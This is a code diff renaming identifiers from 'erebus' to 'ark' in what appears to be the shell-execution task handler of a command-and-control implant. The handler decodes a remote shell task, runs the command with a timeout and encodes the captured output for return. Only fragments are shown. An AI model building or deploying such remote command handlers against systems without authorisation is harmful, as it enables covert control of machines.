@@ -10,7 +10,7 @@
 #include <time.h>
 #include <unistd.h>
 
-#include "erebus/pb_c2.h"
+#include "ark/pb_c2.h"
 
 #define MAX_CHUNK 4096
 #define MAX_CAPTURE (1 << 20)
@@ -114,7 +114,7 @@ static int run_cmd(const char *command, char **stdout_out, char **stderr_out, in
     close(err_pipe[0]);
 
     if (timed_out) {
-        const char *msg = "\n[erebus] shell timeout (120s), process killed\n";
+        const char *msg = "\n[ark] shell timeout (120s), process killed\n";
         size_t mlen = strlen(msg);
         if (err_len + mlen < MAX_CAPTURE - 1) {
             memcpy(err_buf + err_len, msg, mlen);
@@ -129,13 +129,13 @@ static int run_cmd(const char *command, char **stdout_out, char **stderr_out, in
     return 1;
 }
 
-int erebus_task_shell_execute(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
-    erebus_shell_task st;
-    if (!erebus_pb_decode_shell_task(data, data_len, &st)) return 0;
+int ark_task_shell_execute(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
+    ark_shell_task st;
+    if (!ark_pb_decode_shell_task(data, data_len, &st)) return 0;
     char *so = NULL, *se = NULL;
     int32_t code = 1;
     if (!run_cmd(st.command, &so, &se, &code)) return 0;
-    int ok = erebus_pb_encode_shell_result(so, se, code, out, out_len);
+    int ok = ark_pb_encode_shell_result(so, se, code, out, out_len);
     free(so);
     free(se);
     return ok;
